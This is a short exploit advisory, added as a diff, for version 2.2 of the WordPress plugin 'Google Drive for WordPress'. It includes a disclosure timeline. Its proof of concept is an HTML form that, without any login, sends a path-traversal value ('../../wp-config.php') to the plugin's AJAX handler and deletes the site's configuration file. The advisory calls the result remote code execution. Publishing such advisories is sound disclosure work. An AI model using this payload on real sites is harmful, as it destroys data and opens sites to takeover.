@@ -1,0 +1,34 @@
+# Exploit Title:  Plugin Google Drive for WordPress 2.2 – RCE – Unlik
+# Date: 08/04/2018
+# Exploit Author: Lenon Leite
+# Vendor Homepage: *https://wordpress.org/plugins/wp-google-drive/
+# Software Link: *https://wordpress.org/plugins/wp-google-drive/
+# Contact: http://twitter.com/lenonleite
+# Website: http://lenonleite.com.br/
+# Category: webapps
+# Version: 2.2
+# Tested on: Ubuntu 16.1
+
+1 - Description
+
+
+   - Type user access: Don't need of login .
+   - $_POST[‘file_name’] is not escaped.
+
+2. Proof of Concept
+
+1 - Send data form:
+
+<form method="post"
+      action="http://target/wp-content/plugins/wp-google-drive/gdrive-ajaxs.php">
+   <input type="text" name="ajaxstype" value="del_fl_bkp">
+   <input type="text" name="file_name" value="../../wp-config.php">
+   <input type="text" name="id" value="1">
+   <input type="submit">
+</form>
+
+
+#   - Date Discovery : *11/25/2017*
+#   - Date Vendor Contact : *12/26/2017*
+#   - Date Publish : 08/04/2018
+#   - Date Resolution :
